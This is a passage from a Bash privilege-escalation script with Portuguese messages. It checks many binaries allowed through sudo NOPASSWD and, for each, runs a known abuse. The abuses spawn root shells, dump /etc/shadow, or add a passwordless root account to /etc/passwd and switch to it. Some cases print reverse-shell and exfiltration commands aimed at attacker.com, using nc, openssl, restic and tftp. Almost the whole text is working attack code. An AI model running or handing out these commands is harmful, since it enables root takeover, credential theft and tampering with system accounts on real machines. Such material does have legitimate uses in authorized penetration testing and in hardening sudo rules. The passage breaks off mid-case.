            echo "sudo lwp-download $URL $LFILE"
            ;;
        lwp-request)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" "file://$LFILE"
            ;;
        mail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --exec='!/bin/sh'
            ;;
        make)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='/bin/sh'
            sudo "$paths" -s --eval=$'x:\n\t-'"$cmd"
            ;;
        man)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" man
            !/bin/sh
            ;;
        mawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        minicom)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo minicom -D /dev/null"
            echo "[+] Press Ctrl-A o and select Filenames and paths;"
            echo "[+] Press e, type /bin/sh, then Enter;"
            echo "[+] Press Esc twice;"
            echo "[+] Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x."
            ;;
        more)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TERM= sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        mosquitto)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow
            ;;
        mount)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o bind /bin/sh /bin/mount
            sudo "$paths"
            ;;
        msfconsole)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo "$paths""
            echo "irb"
            echo "system("/bin/sh")"
            ;;
        msgattrib)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgcat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgconv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        msgfilter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo x | sudo "$paths" -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
            ;;
        msgmerge)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow /dev/null
            ;;
        msguniq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -P /etc/shadow
            ;;
        mtr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --raw -F /etc/shadow
            ;;
        multitime)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        mv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "LFILE=file_to_write"
            echo "TF=$(mktemp)"
            echo "echo "DATA" > $TF"
            echo "sudo mv $TF $LFILE"
            ;;
        mysql)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e '\! /bin/sh'
            ;;
        nano)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^R^X
            reset; sh 1>&0 2>&0
            ;;
        nasm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -@ /etc/shadow
            ;;
        nawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        nc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "sudo nc -e /bin/sh $RHOST $RPORT"
            ;;
        ncdu)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            b
            ;;
        ncftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        neofetch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec /bin/sh' >$TF
            sudo "$paths" --config $TF
            ;;
        nft)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        nice)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        nl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -bn -w1 -s '' /etc/shadow
            ;;
        nm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" @$LFILE
            ;;
        nmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            sudo "$paths" --script=$TF
            ;;
        node)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
            ;;
        nohup)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
            ;;
        npm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
            sudo "$paths" -C $TF --unsafe-perm i
            ;;
        nroff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '#!/bin/sh' > $TF/groff
            echo '/bin/sh' >> $TF/groff
            chmod +x $TF/groff
            sudo GROFF_BIN_PATH=$TF "$paths"
            ;;
        nsenter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ntpdate)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a x -k /etc/shadow -d localhost
            ;;
        octave)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo octave-cli --eval 'system("/bin/sh")'
            ;;
        od)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -An -c -w9999 /etc/shadow
            ;;
        openssl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
            echo "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
            ;;
        openvpn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --config /etc/shadow
            sudo "$paths" --dev null --script-security 2 --up '/bin/sh -c sh'
            ;;
        openvt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            TF=$(mktemp -u)
            sudo "$paths" -- sh -c "$cmd >$TF 2>&1"
            cat $TF
            ;;
        opkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'exec /bin/sh' > $TF/x.sh
            fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
            sudo "$paths" install x_1.0_all.deb
            ;;
        pandoc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' >$TF
            sudo "$paths" -L $TF /dev/null
            ;;
        paste)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        pdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'import os; os.system("/bin/sh")' > $TF
            sudo "$paths" $TF
            cont
            ;;
        pdflatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        pdftex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        perf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" stat /bin/sh
            ;;
        perl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh";'
            ;;
        perlbug)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s 'x x x' -r x -c x -e 'exec /bin/sh;'
            ;;
        pexec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        pg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        php)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            CMD="/bin/sh"
            sudo "$paths" -r "system('$CMD');"
            ;;
        pic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -U
            .PS
            sh X sh X
            ;;
        pico)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^R^X
            reset; sh 1>&0 2>&0
            ;;
        pidstat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            sudo "$paths" -e $cmd
            ;;
        pip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
            sudo "$paths" install $TF
            ;;
        pkexec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        pkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
            sudo "$paths" install -y --no-repo-update ./x-1.0.txz
            ;;
        posh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        pr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        pry)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "sudo "$paths""
            echo "system("/bin/sh")"
            ;;
        psftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        psql)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            \?
            !/bin/sh
            ;;
        ptx)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -w 5000 /etc/shadow
            ;;
        puppet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
            ;;
        pwsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        python | python3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c 'import os; os.system("/bin/sh")'
            ;;
        rake)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -p '`/bin/sh 1>&0`'
            ;;
        rc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '/bin/sh'
            ;;
        readelf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" -a @$LFILE
            ;;
        red)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo red file_to_write"
            echo "a"
            echo "DATA"
            echo "."
            echo "w"
            echo "q"
            ;;
        redcarpet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        restic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "LFILE=file_or_dir_to_get"
            echo "NAME=backup_name"
            echo "sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE""
            ;;
        rev)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths"
            ;;
        rlwrap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        rpm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -eval '%{lua:os.execute("/bin/sh")}'
            ;;
        rpmdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%(/bin/sh 1>&2)'
            ;;
        rpmquery)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%{lua:posix.exec("/bin/sh")}'
            ;;
        rpmverify)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --eval '%(/bin/sh 1>&2)'
            ;;
        rsync)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
            ;;
        ruby)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh"'
            ;;
        run-mailcap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --action=view /etc/hosts
            !/bin/sh
            ;;
        run-parts)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --new-session --regex '^sh$' /bin
            ;;
        runscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '! exec /bin/sh' >$TF
            sudo "$paths" $TF
            ;;
        rview)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
            ;;
        rvim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            echo "sudo "$paths" -c ':lua os.execute("reset; exec sh")'"
            ;;
        sash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        scanmem)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            shell /bin/sh
            ;;
        scp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'sh 0<&2 1>&2' > $TF
            chmod +x "$TF"
            sudo "$paths" -S $TF x y:
            ;;
        screen)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        script)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q /dev/null
            ;;
        scrot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e /bin/sh
            ;;
        sed)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n '1e exec sh 1>&0' /etc/hosts
            ;;
        service)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" ../../bin/sh
            ;;
        setarch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" $(arch) /bin/sh
            ;;
        setfacl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            USER=$(id -un)
            sudo "$paths" -m -u:$USER:rwx $LFILE
            cat /etc/shadow
            ;;
        setlock)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" - /bin/sh
            ;;
        sftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            HOST=user@localhost.com
            sudo "$paths" $HOST
            !/bin/sh
            ;;
        sg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" root
            ;;
        shuf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /tmp/passwdBKP
            LFILE=/etc/passwd
            echo 'v::0:0:root:/root:/bin/bash' > /tmp/fke
            sudo "$paths" -e "$(cat /tmp/fke)" -o $LFILE
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        slsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'system("/bin/sh")'
            ;;
        smbclient)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '\\x\y'
            !/bin/sh
            ;;
        snap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            cd $(mktemp -d)
            mkdir -p meta/hooks
            printf '#!/bin/sh\n%s; false' "$cmd" >meta/hooks/install
            chmod +x meta/hooks/install
            fpm -n xxxx -s dir -t snap -a all meta
            sudo "$paths" install xxxx_1.0_all.snap --dangerous --devmode
            ;;
        socat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" stdin exec:/bin/sh
            ;;
        soelim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        softlimit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        sort)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -m /etc/shadow
            ;;
        split)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --filter=/bin/sh /dev/stdin
            ;;
        sqlite3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null '.shell /bin/sh'
            ;;
        sqlmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
            ;;
        ss)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a -F /etc/shadow
            ;;
        ssh-agent)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/
            ;;
        ssh-keygen)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -D ./lib.so
            ;;
        ssh-keyscan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        ssh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o ProxyCommand=';sh 0<&2 1>&2' x
            ;;
        sshpass)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        start-stop-daemon)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n $RANDOM -S -x /bin/sh
            ;;
        stdbuf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i0 /bin/sh
            ;;
        strace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o /dev/null /bin/sh
            ;;
        strings)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        su)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        sudo)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        sysctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='/bin/sh -c id>/tmp/id'
            sudo "$paths" "kernel.core_pattern=|$cmd"
            sleep 9999 &
            kill -QUIT $!
            cat /tmp/id
            ;;
        systemctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (exitem 3 tecnicas):"
            sudo "$paths"
            !sh
            ;;
        systemd-resolve)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --status
            !sh
            ;;
        tac)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s 'RANDOM' /etc/shadow
            ;;
        tail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c1G /etc/shadow
            ;;
        tar)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        task)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" execute /bin/sh
            ;;
        taskset)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 1 /bin/sh
            ;;
        tasksh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        tbl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        tclsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 
            exec /bin/sh <@stdin >@stdout 2>@stderr
            ;;
        tcpdump)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='id'
            TF=$(mktemp)
            echo "$cmd" > $TF
            chmod +x $TF
            sudo "$paths" -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
            ;;
        tdbtool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 
            ! /bin/sh
            ;;
        tee)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /etc/passwdBKP
            echo 'v::0:0:root:/root:/bin/bash' | sudo "$paths" -a /etc/passwd
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "[+] Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        telnet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=test.com"
            echo "RPORT=12345"
            echo "sudo "$paths" $RHOST $RPORT"
            echo "^]"
            echo "!/bin/sh"
            ;;
        terraform)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo "$paths" console"
            echo "file("file_to_read")"
            ;;
        tex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        tftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "RHOST=attacker.com"
            echo "sudo tftp $RHOST"
            echo "put file_to_send"
            ;;
        tic)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -C /etc/shadow
            ;;
        time)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        timedatectl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" list-timezones
            !/bin/sh
            ;;
        timeout)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --foreground 7d /bin/sh
            ;;
        tmate)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /bin/sh
            ;;
        tmux)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        top)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
            echo "[+] Pressione ENTER duas vezes e depois 'x' para shell root"
            sudo "$paths"
            reset
            ;;
        torify)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        torsocks)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        troff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        ul)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        unexpand)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -t99999999 /etc/shadow
            ;;
        uniq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        unshare)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        unsquashfs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo unsquashfs shell"
            echo "./squashfs-root/sh -p"
            ;;
        unzip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo unzip -K shell.zip"
            echo "./sh -p"
            ;;
        update-alternatives)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /etc/passwd /etc/passwdBKP
            LFILE=/etc/passwd
            TF=$(mktemp)
            echo 'v::0:0:root:/root:/bin/bash' > $TF
            sudo "$paths" --force --install "$LFILE" x "$TF" 0
            echo "[+] Usuario v criado. Abrindo shell:"
            su v
            id
            echo "[+] Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
            ;;
        uudecode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/stdout | "$paths"
            ;;
        uuencode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/stdout | "$paths"
            ;;
        vagrant)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cd $(mktemp -d)
            echo 'exec "/bin/sh"' > Vagrantfile
            sudo "$paths" up
            ;;
        valgrind)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        varnishncsa)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '%{run{/bin/bash}}x' > $TF
            sudo "$paths" -F "$(cat $TF)"
            id
            ;;
        vi)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c ':!/bin/sh' /dev/null
            ;;
        view)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -c ':!/bin/sh'
            ;;
        vigr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        vim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            echo "Após abrir o vim, digite ':!COMANDO'"
            sudo "$paths"
            ;;
        vimdiff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            echo "Pressione ENTER, e em seguida ':!COMANDO'"
            sudo "$paths" -c ':!/bin/sh'
            ;;
        vipw)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        virsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/sbuaisdh.sh
            chmod +x /tmp/sbuaisdh.sh
            SCRIPT=/tmp/sbuaisdh.sh
            TF=$(mktemp)
            cat > $TF << EOF
            <domain type='kvm'>
              <name>x</name>
              <os>
                <type arch='x86_64'>hvm</type>
              </os>
              <memory unit='KiB'>1</memory>
              <devices>
                <interface type='ethernet'>
                  <script path='$SCRIPT'/>
                </interface>
              </devices>
            </domain>
EOF
            sudo "$paths" -c qemu:///system create $TF
            "$paths" -c qemu:///system destroy x
            /bin/bash -p
            id
            ;;
        w3m)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"  /etc/shadow -dump
            ;;
        wall)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --nobanner /etc/shadow
            ;;
        watch)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -x sh -c 'reset; exec sh 1>&0 2>&0'
            ;;
        wc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --files0-from /etc/shadow
            ;;
        wget)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            chmod +x $TF
            echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
            sudo "$paths" --use-askpass=$TF 0
            ;;
        whiptail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
